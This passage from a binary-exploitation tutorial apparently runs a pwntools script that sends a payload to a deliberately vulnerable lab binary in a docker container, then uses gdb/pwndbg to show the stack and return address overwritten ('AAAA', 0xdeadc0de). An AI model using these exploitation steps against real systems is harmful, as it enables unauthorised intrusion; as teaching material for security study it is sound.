    <span id="cb246-13"><a href="#cb246-13" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Print the process id</span></span>
    <span id="cb246-14"><a href="#cb246-14" aria-hidden="true" tabindex="-1"></a>    <span class="bu">raw_input</span>(<span class="bu">str</span>(p.proc.pid))</span>
    <span id="cb246-15"><a href="#cb246-15" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb246-16"><a href="#cb246-16" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Send the payload</span></span>
    <span id="cb246-17"><a href="#cb246-17" aria-hidden="true" tabindex="-1"></a>    p.send(payload)</span>
    <span id="cb246-18"><a href="#cb246-18" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb246-19"><a href="#cb246-19" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Transfer interaction to the user</span></span>
    <span id="cb246-20"><a href="#cb246-20" aria-hidden="true" tabindex="-1"></a>    p.interactive()</span>
    <span id="cb246-21"><a href="#cb246-21" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb246-22"><a href="#cb246-22" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&#39;__main__&#39;</span>:</span>
    <span id="cb246-23"><a href="#cb246-23" aria-hidden="true" tabindex="-1"></a>    main()</span></code></pre></div>
    <p>Which you can run through:</p>
    <div class="sourceCode" id="cb247"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb247-1"><a href="#cb247-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@9a78bba9592e:~/tutorial/scripts#</span> python 1_skeleton.py</span>
    <span id="cb247-2"><a href="#cb247-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Starting local process <span class="st">&#39;../build/1_staticnx&#39;</span>: pid 89</span>
    <span id="cb247-3"><a href="#cb247-3" aria-hidden="true" tabindex="-1"></a><span class="ex">89</span></span>
    <span id="cb247-4"><a href="#cb247-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Switching to interactive mode</span>
    <span id="cb247-5"><a href="#cb247-5" aria-hidden="true" tabindex="-1"></a><span class="ex">This</span> is a big vulnerable example!</span>
    <span id="cb247-6"><a href="#cb247-6" aria-hidden="true" tabindex="-1"></a><span class="ex">I</span> can print many things: deadbeef, Test String, 42</span>
    <span id="cb247-7"><a href="#cb247-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Writing</span> to STDOUT</span>
    <span id="cb247-8"><a href="#cb247-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Reading</span> from STDIN</span>
    <span id="cb247-9"><a href="#cb247-9" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Got EOF while reading in interactive</span>
    <span id="cb247-10"><a href="#cb247-10" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span></span>
    <span id="cb247-11"><a href="#cb247-11" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Process <span class="st">&#39;../build/1_staticnx&#39;</span> stopped with exit code <span class="at">-11</span> <span class="er">(</span><span class="ex">SIGSEGV</span><span class="kw">)</span> <span class="kw">(</span><span class="ex">pid</span> 89<span class="kw">)</span></span>
    <span id="cb247-12"><a href="#cb247-12" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Got EOF while sending in interactive</span></code></pre></div>
    <p>Note that the instruction</p>
    <div class="sourceCode" id="cb248"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb248-1"><a href="#cb248-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Print the process id</span></span>
    <span id="cb248-2"><a href="#cb248-2" aria-hidden="true" tabindex="-1"></a><span class="bu">raw_input</span>(<span class="bu">str</span>(p.proc.pid))</span></code></pre></div>
    <p>in the script was placed there to launch a gdb instance in another terminal. Let’s go for it then. In another terminal, we connect to the docker container through:</p>
    <div class="sourceCode" id="cb249"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb249-1"><a href="#cb249-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker ps</span>
    <span id="cb249-2"><a href="#cb249-2" aria-hidden="true" tabindex="-1"></a><span class="ex">CONTAINER</span> ID        IMAGE                         COMMAND             CREATED             STATUS              PORTS               NAMES</span>
    <span id="cb249-3"><a href="#cb249-3" aria-hidden="true" tabindex="-1"></a><span class="ex">9a78bba9592e</span>        basic_cybersecurity10:latest   <span class="st">&quot;/bin/bash&quot;</span>         About an hour ago   Up About an hour                        heuristic_gates</span>
    <span id="cb249-4"><a href="#cb249-4" aria-hidden="true" tabindex="-1"></a><span class="ex">victor</span> at Victors-MacBook in ~/web on bounties<span class="pp">*</span></span>
    <span id="cb249-5"><a href="#cb249-5" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker exec <span class="at">-it</span> 9a78bba9592e bash</span>
    <span id="cb249-6"><a href="#cb249-6" aria-hidden="true" tabindex="-1"></a><span class="ex">root@9a78bba9592e:~#</span></span></code></pre></div>
    <p>now we proceed as follows:</p>
    <div class="sourceCode" id="cb250"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb250-1"><a href="#cb250-1" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb250-2"><a href="#cb250-2" aria-hidden="true" tabindex="-1"></a><span class="co"># Terminal 1</span></span>
    <span id="cb250-3"><a href="#cb250-3" aria-hidden="true" tabindex="-1"></a><span class="ex">root@9a78bba9592e:~/tutorial/scripts#</span> python 1_skeleton.py</span>
    <span id="cb250-4"><a href="#cb250-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Starting local process <span class="st">&#39;../build/1_staticnx&#39;</span>: pid 123</span>
    <span id="cb250-5"><a href="#cb250-5" aria-hidden="true" tabindex="-1"></a><span class="ex">123</span></span>
    <span id="cb250-6"><a href="#cb250-6" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb250-7"><a href="#cb250-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Terminal 2</span></span>
    <span id="cb250-8"><a href="#cb250-8" aria-hidden="true" tabindex="-1"></a><span class="ex">root@9a78bba9592e:~#</span> gdb <span class="at">-p</span> 123</span>
    <span id="cb250-9"><a href="#cb250-9" aria-hidden="true" tabindex="-1"></a><span class="ex">GNU</span> gdb <span class="er">(</span><span class="ex">Ubuntu</span> 7.11.1-0ubuntu1~16.5<span class="kw">)</span> <span class="ex">7.11.1</span></span>
    <span id="cb250-10"><a href="#cb250-10" aria-hidden="true" tabindex="-1"></a><span class="ex">Copyright</span> <span class="er">(</span><span class="ex">C</span><span class="kw">)</span> <span class="ex">2016</span> Free Software Foundation, Inc.</span>
    <span id="cb250-11"><a href="#cb250-11" aria-hidden="true" tabindex="-1"></a><span class="ex">License</span> GPLv3+: GNU GPL version 3 or later <span class="op">&lt;</span>http://gnu.org/licenses/gpl.html<span class="op">&gt;</span></span>
    <span id="cb250-12"><a href="#cb250-12" aria-hidden="true" tabindex="-1"></a><span class="ex">This</span> is free software: you are free to change and redistribute it.</span>
    <span id="cb250-13"><a href="#cb250-13" aria-hidden="true" tabindex="-1"></a><span class="ex">There</span> is NO WARRANTY, to the extent permitted by law.  Type <span class="st">&quot;show copying&quot;</span></span>
    <span id="cb250-14"><a href="#cb250-14" aria-hidden="true" tabindex="-1"></a><span class="ex">and</span> <span class="st">&quot;show warranty&quot;</span> for details.</span>
    <span id="cb250-15"><a href="#cb250-15" aria-hidden="true" tabindex="-1"></a><span class="ex">This</span> GDB was configured as <span class="st">&quot;x86_64-linux-gnu&quot;</span>.</span>
    <span id="cb250-16"><a href="#cb250-16" aria-hidden="true" tabindex="-1"></a><span class="ex">Type</span> <span class="st">&quot;show configuration&quot;</span> for configuration details.</span>
    <span id="cb250-17"><a href="#cb250-17" aria-hidden="true" tabindex="-1"></a><span class="ex">For</span> bug reporting instructions, please see:</span>
    <span id="cb250-18"><a href="#cb250-18" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>http://www.gnu.org/software/gdb/bugs/<span class="op">&gt;</span>.</span>
    <span id="cb250-19"><a href="#cb250-19" aria-hidden="true" tabindex="-1"></a><span class="ex">Find</span> the GDB manual and other documentation resources online at:</span>
    <span id="cb250-20"><a href="#cb250-20" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>http://www.gnu.org/software/gdb/documentation/<span class="op">&gt;</span>.</span>
    <span id="cb250-21"><a href="#cb250-21" aria-hidden="true" tabindex="-1"></a><span class="ex">For</span> help, type <span class="st">&quot;help&quot;</span>.</span>
    <span id="cb250-22"><a href="#cb250-22" aria-hidden="true" tabindex="-1"></a><span class="ex">Type</span> <span class="st">&quot;apropos word&quot;</span> to search for commands related to <span class="st">&quot;word&quot;</span>.</span>
    <span id="cb250-23"><a href="#cb250-23" aria-hidden="true" tabindex="-1"></a><span class="ex">pwndbg:</span> loaded 162 commands. Type pwndbg [filter] for a list.</span>
    <span id="cb250-24"><a href="#cb250-24" aria-hidden="true" tabindex="-1"></a><span class="ex">pwndbg:</span> created <span class="va">$rebase</span>, <span class="va">$ida</span> gdb functions <span class="er">(</span><span class="ex">can</span> be used with print/break<span class="kw">)</span></span>
    <span id="cb250-25"><a href="#cb250-25" aria-hidden="true" tabindex="-1"></a><span class="ex">Attaching</span> to process 123</span>
    <span id="cb250-26"><a href="#cb250-26" aria-hidden="true" tabindex="-1"></a><span class="ex">Reading</span> symbols from /root/tutorial/build/1_staticnx...<span class="er">(</span><span class="ex">no</span> debugging symbols found<span class="kw">)</span><span class="ex">...done.</span></span>
    <span id="cb250-27"><a href="#cb250-27" aria-hidden="true" tabindex="-1"></a><span class="ex">0xf7790b49</span> in __kernel_vsyscall <span class="er">(</span><span class="kw">)</span></span>
    <span id="cb250-28"><a href="#cb250-28" aria-hidden="true" tabindex="-1"></a><span class="ex">LEGEND:</span> STACK <span class="kw">|</span> <span class="ex">HEAP</span> <span class="kw">|</span> <span class="ex">CODE</span> <span class="kw">|</span> <span class="ex">DATA</span> <span class="kw">|</span> <span class="ex">RWX</span> <span class="kw">|</span> <span class="ex">RODATA</span></span>
    <span id="cb250-29"><a href="#cb250-29" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> REGISTERS <span class="bu">]</span></span>
    <span id="cb250-30"><a href="#cb250-30" aria-hidden="true" tabindex="-1"></a> <span class="ex">EAX</span>  0xfffffe00</span>
    <span id="cb250-31"><a href="#cb250-31" aria-hidden="true" tabindex="-1"></a> <span class="ex">EBX</span>  0x0</span>
    <span id="cb250-32"><a href="#cb250-32" aria-hidden="true" tabindex="-1"></a> <span class="ex">ECX</span>  0xff81e348 ◂— 0x21 /<span class="pp">*</span> <span class="st">&#39;!&#39;</span> <span class="pp">*</span>/</span>
    <span id="cb250-33"><a href="#cb250-33" aria-hidden="true" tabindex="-1"></a> <span class="ex">EDX</span>  0x400</span>
    <span id="cb250-34"><a href="#cb250-34" aria-hidden="true" tabindex="-1"></a> <span class="ex">EDI</span>  0x4e</span>
    <span id="cb250-35"><a href="#cb250-35" aria-hidden="true" tabindex="-1"></a> <span class="ex">ESI</span>  0x80ef00c <span class="er">(</span><span class="ex">_GLOBAL_OFFSET_TABLE_+12</span><span class="kw">)</span> <span class="ex">—▸</span> 0x8069d70 <span class="er">(</span><span class="ex">__strcpy_sse2</span><span class="kw">)</span> <span class="ex">◂—</span> mov    edx, dword ptr [esp + 4]</span>
    <span id="cb250-36"><a href="#cb250-36" aria-hidden="true" tabindex="-1"></a> <span class="ex">EBP</span>  0xff81e3d8 —▸ 0xff81e3e8 ◂— 0x1000</span>
    <span id="cb250-37"><a href="#cb250-37" aria-hidden="true" tabindex="-1"></a> <span class="ex">ESP</span>  0xff81e318 —▸ 0xff81e3d8 —▸ 0xff81e3e8 ◂— 0x1000</span>
    <span id="cb250-38"><a href="#cb250-38" aria-hidden="true" tabindex="-1"></a> <span class="ex">EIP</span>  0xf7790b49 <span class="er">(</span><span class="ex">__kernel_vsyscall+9</span><span class="kw">)</span> <span class="ex">◂—</span> pop    ebp</span>
    <span id="cb250-39"><a href="#cb250-39" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> DISASM <span class="bu">]</span></span>
    <span id="cb250-40"><a href="#cb250-40" aria-hidden="true" tabindex="-1"></a> <span class="ex">►</span> 0xf7790b49 <span class="op">&lt;</span>__kernel_vsyscall+9<span class="op">&gt;</span>     pop    ebp</span>
    <span id="cb250-41"><a href="#cb250-41" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0xf7790b4a</span> <span class="op">&lt;</span>__kernel_vsyscall+10<span class="op">&gt;</span>    pop    edx</span>
    <span id="cb250-42"><a href="#cb250-42" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0xf7790b4b</span> <span class="op">&lt;</span>__kernel_vsyscall+11<span class="op">&gt;</span>    pop    ecx</span>
    <span id="cb250-43"><a href="#cb250-43" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0xf7790b4c</span> <span class="op">&lt;</span>__kernel_vsyscall+12<span class="op">&gt;</span>    ret    </span>
    <span id="cb250-44"><a href="#cb250-44" aria-hidden="true" tabindex="-1"></a>    <span class="ex">↓</span></span>
    <span id="cb250-45"><a href="#cb250-45" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x80710c2</span>  <span class="op">&lt;</span>__read_nocancel+24<span class="op">&gt;</span>      pop    ebx</span>
    <span id="cb250-46"><a href="#cb250-46" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x80710c3</span>  <span class="op">&lt;</span>__read_nocancel+25<span class="op">&gt;</span>      cmp    eax, 0xfffff001</span>
    <span id="cb250-47"><a href="#cb250-47" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x80710c8</span>  <span class="op">&lt;</span>__read_nocancel+30<span class="op">&gt;</span>      jae    __syscall_error <span class="op">&lt;</span>0x8074610<span class="op">&gt;</span></span>
    <span id="cb250-48"><a href="#cb250-48" aria-hidden="true" tabindex="-1"></a>    <span class="ex">↓</span></span>
    <span id="cb250-49"><a href="#cb250-49" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x8074610</span>  <span class="op">&lt;</span>__syscall_error<span class="op">&gt;</span>         mov    edx, 0xffffffe8</span>
    <span id="cb250-50"><a href="#cb250-50" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x8074616</span>  <span class="op">&lt;</span>__syscall_error+6<span class="op">&gt;</span>       neg    eax</span>
    <span id="cb250-51"><a href="#cb250-51" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x8074618</span>  <span class="op">&lt;</span>__syscall_error+8<span class="op">&gt;</span>       mov    dword ptr gs:[edx], eax</span>
    <span id="cb250-52"><a href="#cb250-52" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x807461b</span>  <span class="op">&lt;</span>__syscall_error+11<span class="op">&gt;</span>      mov    eax, 0xffffffff</span>
    <span id="cb250-53"><a href="#cb250-53" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> STACK <span class="bu">]</span></span>
    <span id="cb250-54"><a href="#cb250-54" aria-hidden="true" tabindex="-1"></a><span class="ex">00:0000│</span> esp  0xff81e318 —▸ 0xff81e3d8 —▸ 0xff81e3e8 ◂— 0x1000</span>
    <span id="cb250-55"><a href="#cb250-55" aria-hidden="true" tabindex="-1"></a><span class="ex">01:0004│</span>      0xff81e31c ◂— 0x400</span>
    <span id="cb250-56"><a href="#cb250-56" aria-hidden="true" tabindex="-1"></a><span class="ex">02:0008│</span>      0xff81e320 —▸ 0xff81e348 ◂— 0x21 /<span class="pp">*</span> <span class="st">&#39;!&#39;</span> <span class="pp">*</span>/</span>
    <span id="cb250-57"><a href="#cb250-57" aria-hidden="true" tabindex="-1"></a><span class="ex">03:000c│</span>      0xff81e324 —▸ 0x80710c2 <span class="er">(</span><span class="ex">__read_nocancel+24</span><span class="kw">)</span> <span class="ex">◂—</span> pop    ebx</span>
    <span id="cb250-58"><a href="#cb250-58" aria-hidden="true" tabindex="-1"></a><span class="ex">04:0010│</span>      0xff81e328 —▸ 0x80481b0 <span class="er">(</span><span class="ex">_init</span><span class="kw">)</span> <span class="ex">◂—</span> push   ebx</span>
    <span id="cb250-59"><a href="#cb250-59" aria-hidden="true" tabindex="-1"></a><span class="ex">05:0014│</span>      0xff81e32c —▸ 0x80488d2 <span class="er">(</span><span class="ex">vuln+54</span><span class="kw">)</span> <span class="ex">◂—</span> add    esp, 0x10</span>
    <span id="cb250-60"><a href="#cb250-60" aria-hidden="true" tabindex="-1"></a><span class="ex">06:0018│</span>      0xff81e330 ◂— 0x0</span>
    <span id="cb250-61"><a href="#cb250-61" aria-hidden="true" tabindex="-1"></a><span class="ex">07:001c│</span>      0xff81e334 —▸ 0xff81e348 ◂— 0x21 /<span class="pp">*</span> <span class="st">&#39;!&#39;</span> <span class="pp">*</span>/</span>
    <span id="cb250-62"><a href="#cb250-62" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> BACKTRACE <span class="bu">]</span></span>
    <span id="cb250-63"><a href="#cb250-63" aria-hidden="true" tabindex="-1"></a> <span class="ex">►</span> f 0 f7790b49 __kernel_vsyscall+9</span>
    <span id="cb250-64"><a href="#cb250-64" aria-hidden="true" tabindex="-1"></a>   <span class="ex">f</span> 1  80710c2 __read_nocancel+24</span>
    <span id="cb250-65"><a href="#cb250-65" aria-hidden="true" tabindex="-1"></a>   <span class="ex">f</span> 2  80488d2 vuln+54</span>
    <span id="cb250-66"><a href="#cb250-66" aria-hidden="true" tabindex="-1"></a>   <span class="ex">f</span> 3  80489d2 main+123</span>
    <span id="cb250-67"><a href="#cb250-67" aria-hidden="true" tabindex="-1"></a>   <span class="ex">f</span> 4  8048c01 generic_start_main+545</span>
    <span id="cb250-68"><a href="#cb250-68" aria-hidden="true" tabindex="-1"></a>   <span class="ex">f</span> 5  8048dfd __libc_start_main+285</span>
    <span id="cb250-69"><a href="#cb250-69" aria-hidden="true" tabindex="-1"></a> <span class="ex">pwndbg</span><span class="op">&gt;</span> b 14</span>
    <span id="cb250-70"><a href="#cb250-70" aria-hidden="true" tabindex="-1"></a> <span class="ex">Breakpoint</span> 1 at 0x80488d5: file ./src/1_staticnx.c, line 14.</span>
    <span id="cb250-71"><a href="#cb250-71" aria-hidden="true" tabindex="-1"></a> <span class="ex">pwndbg</span><span class="op">&gt;</span> c</span>
    <span id="cb250-72"><a href="#cb250-72" aria-hidden="true" tabindex="-1"></a> <span class="ex">Continuing.</span></span>
    <span id="cb250-73"><a href="#cb250-73" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb250-74"><a href="#cb250-74" aria-hidden="true" tabindex="-1"></a> <span class="co"># Terminal 1</span></span>
    <span id="cb250-75"><a href="#cb250-75" aria-hidden="true" tabindex="-1"></a> <span class="co"># Press ENTER to get:</span></span>
    <span id="cb250-76"><a href="#cb250-76" aria-hidden="true" tabindex="-1"></a> <span class="ex">[*]</span> Switching to interactive mode</span>
    <span id="cb250-77"><a href="#cb250-77" aria-hidden="true" tabindex="-1"></a> <span class="ex">This</span> is a big vulnerable example!</span>
    <span id="cb250-78"><a href="#cb250-78" aria-hidden="true" tabindex="-1"></a> <span class="ex">I</span> can print many things: deadbeef, Test String, 42</span>
    <span id="cb250-79"><a href="#cb250-79" aria-hidden="true" tabindex="-1"></a> <span class="ex">Writing</span> to STDOUT</span>
    <span id="cb250-80"><a href="#cb250-80" aria-hidden="true" tabindex="-1"></a> <span class="ex">Reading</span> from STDIN</span>
    <span id="cb250-81"><a href="#cb250-81" aria-hidden="true" tabindex="-1"></a> <span class="ex">$</span>  </span>
    <span id="cb250-82"><a href="#cb250-82" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb250-83"><a href="#cb250-83" aria-hidden="true" tabindex="-1"></a><span class="co"># Terminal 2</span></span>
    <span id="cb250-84"><a href="#cb250-84" aria-hidden="true" tabindex="-1"></a><span class="ex">Breakpoint</span> 1, vuln <span class="er">(</span><span class="kw">)</span> <span class="ex">at</span> ./src/1_staticnx.c:14</span>
    <span id="cb250-85"><a href="#cb250-85" aria-hidden="true" tabindex="-1"></a><span class="ex">14</span>      if <span class="er">(</span><span class="ex">strcmp</span><span class="er">(</span><span class="ex">buffer,</span> <span class="st">&quot;Cool Input&quot;</span><span class="kw">)</span> <span class="ex">==</span> 0<span class="kw">)</span> <span class="kw">{</span></span>
    <span id="cb250-86"><a href="#cb250-86" aria-hidden="true" tabindex="-1"></a><span class="ex">LEGEND:</span> STACK <span class="kw">|</span> <span class="ex">HEAP</span> <span class="kw">|</span> <span class="ex">CODE</span> <span class="kw">|</span> <span class="ex">DATA</span> <span class="kw">|</span> <span class="ex">RWX</span> <span class="kw">|</span> <span class="ex">RODATA</span></span>
    <span id="cb250-87"><a href="#cb250-87" aria-hidden="true" tabindex="-1"></a><span class="ex">─────────────────────────────────────────────────────────────────[</span> REGISTERS ]─────────────────────────────────────────────────────────────────</span>
    <span id="cb250-88"><a href="#cb250-88" aria-hidden="true" tabindex="-1"></a><span class="ex">*EAX</span>  0x3e8</span>
    <span id="cb250-89"><a href="#cb250-89" aria-hidden="true" tabindex="-1"></a><span class="ex">*EBX</span>  0x80481b0 <span class="er">(</span><span class="ex">_init</span><span class="kw">)</span> <span class="ex">◂—</span> push   ebx</span>
    <span id="cb250-90"><a href="#cb250-90" aria-hidden="true" tabindex="-1"></a> <span class="ex">ECX</span>  0xff8094d8 ◂— 0x41414141 <span class="er">(</span><span class="st">&#39;AAAA&#39;</span><span class="kw">)</span></span>
    <span id="cb250-91"><a href="#cb250-91" aria-hidden="true" tabindex="-1"></a> <span class="ex">EDX</span>  0x400</span>
    <span id="cb250-92"><a href="#cb250-92" aria-hidden="true" tabindex="-1"></a> <span class="ex">EDI</span>  0x4e</span>
    <span id="cb250-93"><a href="#cb250-93" aria-hidden="true" tabindex="-1"></a> <span class="ex">ESI</span>  0x80ef00c <span class="er">(</span><span class="ex">_GLOBAL_OFFSET_TABLE_+12</span><span class="kw">)</span> <span class="ex">—▸</span> 0x8069d70 <span class="er">(</span><span class="ex">__strcpy_sse2</span><span class="kw">)</span> <span class="ex">◂—</span> mov    edx, dword ptr [esp + 4]</span>
    <span id="cb250-94"><a href="#cb250-94" aria-hidden="true" tabindex="-1"></a> <span class="ex">EBP</span>  0xff809568 ◂— 0x41414141 <span class="er">(</span><span class="st">&#39;AAAA&#39;</span><span class="kw">)</span></span>
    <span id="cb250-95"><a href="#cb250-95" aria-hidden="true" tabindex="-1"></a><span class="ex">*ESP</span>  0xff8094d0 —▸ 0x80ef200 <span class="er">(</span><span class="ex">_IO_2_1_stdout_</span><span class="kw">)</span> <span class="ex">◂—</span> 0xfbad2887</span>
    <span id="cb250-96"><a href="#cb250-96" aria-hidden="true" tabindex="-1"></a><span class="ex">*EIP</span>  0x80488d5 <span class="er">(</span><span class="ex">vuln+57</span><span class="kw">)</span> <span class="ex">◂—</span> sub    esp, 8</span>
    <span id="cb250-97"><a href="#cb250-97" aria-hidden="true" tabindex="-1"></a><span class="ex">──────────────────────────────────────────────────────────────────[</span> DISASM ]───────────────────────────────────────────────────────────────────</span>
    <span id="cb250-98"><a href="#cb250-98" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x80488d2</span> <span class="op">&lt;</span>vuln+54<span class="op">&gt;</span>    add    esp, 0x10</span>
    <span id="cb250-99"><a href="#cb250-99" aria-hidden="true" tabindex="-1"></a> <span class="ex">►</span> 0x80488d5 <span class="op">&lt;</span>vuln+57<span class="op">&gt;</span>    sub    esp, 8</span>
    <span id="cb250-100"><a href="#cb250-100" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x80488d8</span> <span class="op">&lt;</span>vuln+60<span class="op">&gt;</span>    push   0x80bedfb</span>
    <span id="cb250-101"><a href="#cb250-101" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x80488dd</span> <span class="op">&lt;</span>vuln+65<span class="op">&gt;</span>    lea    eax, dword ptr [ebp <span class="at">-</span> 0x90]</span>
    <span id="cb250-102"><a href="#cb250-102" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x80488e3</span> <span class="op">&lt;</span>vuln+71<span class="op">&gt;</span>    push   eax</span>
    <span id="cb250-103"><a href="#cb250-103" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x80488e4</span> <span class="op">&lt;</span>vuln+72<span class="op">&gt;</span>    call   0x80482a0</span>
    <span id="cb250-104"><a href="#cb250-104" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb250-105"><a href="#cb250-105" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x80488e9</span> <span class="op">&lt;</span>vuln+77<span class="op">&gt;</span>    add    esp, 0x10</span>
    <span id="cb250-106"><a href="#cb250-106" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x80488ec</span> <span class="op">&lt;</span>vuln+80<span class="op">&gt;</span>    test   eax, eax</span>
    <span id="cb250-107"><a href="#cb250-107" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x80488ee</span> <span class="op">&lt;</span>vuln+82<span class="op">&gt;</span>    jne    vuln+100 <span class="op">&lt;</span>0x8048900<span class="op">&gt;</span></span>
    <span id="cb250-108"><a href="#cb250-108" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb250-109"><a href="#cb250-109" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x80488f0</span> <span class="op">&lt;</span>vuln+84<span class="op">&gt;</span>    sub    esp, 0xc</span>
    <span id="cb250-110"><a href="#cb250-110" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x80488f3</span> <span class="op">&lt;</span>vuln+87<span class="op">&gt;</span>    push   0x80bee06</span>
    <span id="cb250-111"><a href="#cb250-111" aria-hidden="true" tabindex="-1"></a><span class="ex">───────────────────────────────────────────────────────────────[</span> SOURCE <span class="er">(</span><span class="ex">CODE</span><span class="kw">)</span> <span class="ex">]───────────────────────────────────────────────────────────────</span></span>
    <span id="cb250-112"><a href="#cb250-112" aria-hidden="true" tabindex="-1"></a>    <span class="ex">9</span>     char <span class="pp">*</span> second_buffer<span class="kw">;</span></span>
    <span id="cb250-113"><a href="#cb250-113" aria-hidden="true" tabindex="-1"></a>   <span class="ex">10</span>     uint32_t length = 0<span class="kw">;</span></span>
    <span id="cb250-114"><a href="#cb250-114" aria-hidden="true" tabindex="-1"></a>   <span class="ex">11</span>     puts<span class="er">(</span><span class="st">&quot;Reading from STDIN&quot;</span><span class="kw">);</span></span>
    <span id="cb250-115"><a href="#cb250-115" aria-hidden="true" tabindex="-1"></a>   <span class="ex">12</span>     read<span class="er">(</span><span class="ex">0,</span> buffer, 1024<span class="kw">);</span></span>
    <span id="cb250-116"><a href="#cb250-116" aria-hidden="true" tabindex="-1"></a>   <span class="ex">13</span></span>
    <span id="cb250-117"><a href="#cb250-117" aria-hidden="true" tabindex="-1"></a> <span class="ex">►</span> 14     if <span class="er">(</span><span class="ex">strcmp</span><span class="er">(</span><span class="ex">buffer,</span> <span class="st">&quot;Cool Input&quot;</span><span class="kw">)</span> <span class="ex">==</span> 0<span class="kw">)</span> <span class="kw">{</span></span>
    <span id="cb250-118"><a href="#cb250-118" aria-hidden="true" tabindex="-1"></a>   <span class="ex">15</span>         puts<span class="er">(</span><span class="st">&quot;What a cool string.&quot;</span><span class="kw">);</span></span>
    <span id="cb250-119"><a href="#cb250-119" aria-hidden="true" tabindex="-1"></a>   <span class="ex">16</span>     }</span>
    <span id="cb250-120"><a href="#cb250-120" aria-hidden="true" tabindex="-1"></a>   <span class="ex">17</span>     length = strlen<span class="er">(</span><span class="ex">buffer</span><span class="kw">);</span></span>
    <span id="cb250-121"><a href="#cb250-121" aria-hidden="true" tabindex="-1"></a>   <span class="ex">18</span>     if <span class="er">(</span><span class="ex">length</span> == 42<span class="kw">)</span> <span class="kw">{</span></span>
    <span id="cb250-122"><a href="#cb250-122" aria-hidden="true" tabindex="-1"></a>   <span class="ex">19</span>         puts<span class="er">(</span><span class="st">&quot;LUE&quot;</span><span class="kw">);</span></span>
    <span id="cb250-123"><a href="#cb250-123" aria-hidden="true" tabindex="-1"></a><span class="ex">───────────────────────────────────────────────────────────────────[</span> STACK ]───────────────────────────────────────────────────────────────────</span>
    <span id="cb250-124"><a href="#cb250-124" aria-hidden="true" tabindex="-1"></a><span class="ex">00:0000│</span> esp  0xff8094d0 —▸ 0x80ef200 <span class="er">(</span><span class="ex">_IO_2_1_stdout_</span><span class="kw">)</span> <span class="ex">◂—</span> 0xfbad2887</span>
    <span id="cb250-125"><a href="#cb250-125" aria-hidden="true" tabindex="-1"></a><span class="ex">01:0004│</span>      0xff8094d4 —▸ 0x80bee20 ◂— push   esp</span>
    <span id="cb250-126"><a href="#cb250-126" aria-hidden="true" tabindex="-1"></a><span class="ex">02:0008│</span> ecx  0xff8094d8 ◂— 0x41414141 <span class="er">(</span><span class="st">&#39;AAAA&#39;</span><span class="kw">)</span></span>
    <span id="cb250-127"><a href="#cb250-127" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span> ↓</span>
    <span id="cb250-128"><a href="#cb250-128" aria-hidden="true" tabindex="-1"></a><span class="ex">─────────────────────────────────────────────────────────────────[</span> BACKTRACE ]─────────────────────────────────────────────────────────────────</span>
    <span id="cb250-129"><a href="#cb250-129" aria-hidden="true" tabindex="-1"></a> <span class="ex">►</span> f 0  80488d5 vuln+57</span>
    <span id="cb250-130"><a href="#cb250-130" aria-hidden="true" tabindex="-1"></a>   <span class="ex">f</span> 1 deadc0de</span>
    <span id="cb250-131"><a href="#cb250-131" aria-hidden="true" tabindex="-1"></a>   <span class="ex">f</span> 2        0</span>
    <span id="cb250-132"><a href="#cb250-132" aria-hidden="true" tabindex="-1"></a><span class="ex">Breakpoint</span> /root/tutorial/src/1_staticnx.c:14</span></code></pre></div>
